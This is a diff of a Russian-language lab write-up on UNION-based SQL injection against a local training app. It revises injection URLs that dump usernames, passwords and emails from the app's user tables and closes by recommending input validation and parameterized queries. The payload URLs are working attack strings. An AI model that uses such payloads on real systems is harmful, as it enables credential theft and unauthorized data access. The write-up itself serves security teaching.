@@ -143,17 +143,17 @@ https://github.com/OWASP/Top10
 `users: id,username,password`
 
 Теперь мы можем сформировать окончательные запросы для получения сведений о пользователе по его идентификатору:
-`http://localhost:8080/task/?id=-1'union select 1, group_concat('[', 'id:', u.id, ' username: ', u.username, ', password: ', u.password, ', email: ', e.email_id, ']'), 1 from users u join emails e on e.id=u.id where u.id=3--+`
+`http://localhost:8080/task/?id=-1'union all select u.id, group_concat(' username: ', u.username, ', password: ', u.password, ', email: ', e.email_id, ']'), 1 from users u left join emails e on e.id=u.id where u.id=3--+`
 
 или по его логину:
 
-`http://localhost:8080/task/?id=-1'union select 1, group_concat('[', 'id:', u.id, ', username: ', u.username, ', password: ', u.password, ', email: ', e.email_id, ']'), 1 from users u join emails e on e.id=u.id where u.username="Volk"--+`
+`http://localhost:8080/task/?id=-1'union select 1, group_concat('[', 'id:', u.id, ', username: ', u.username, ', password: ', u.password, ', email: ', e.email_id, ']'), 1 from users u left join emails e on e.id=u.id where u.username="Volk"--+`
 
 ![user-info](./images/user-info.png)
 
 Так же не составит труда написать запрос, показывающий сведения о пользователе по его электронной почте:
 
-`http://localhost:8080/task/?id=-1'union select 1, group_concat('[', 'id:', u.id, ', username: ', u.username, ', password: ', u.password, ', email: ', e.email_id, ']'), 1 from users u join emails e on e.id=u.id where e.email_id="honey_lover@otus-lab.com"--+`
+`http://localhost:8080/task/?id=-1'union select 1, group_concat('[', 'id:', u.id, ', username: ', u.username, ', password: ', u.password, ', email: ', e.email_id, ']'), 1 from users u left join emails e on e.id=u.id where e.email_id="honey_lover@otus-lab.com"--+`
 
 **Таким образом:**
 
@@ -162,3 +162,4 @@ https://github.com/OWASP/Top10
 `почта пользователя с ником Vinni-pukh: honey_lover@otus-lab.com`
 
 Основные способы противодействия SQL-инъекциям - это экранирование и валидация пользовательского ввода и исключение использования не параметризованных SQL-запросов в приложении.
+
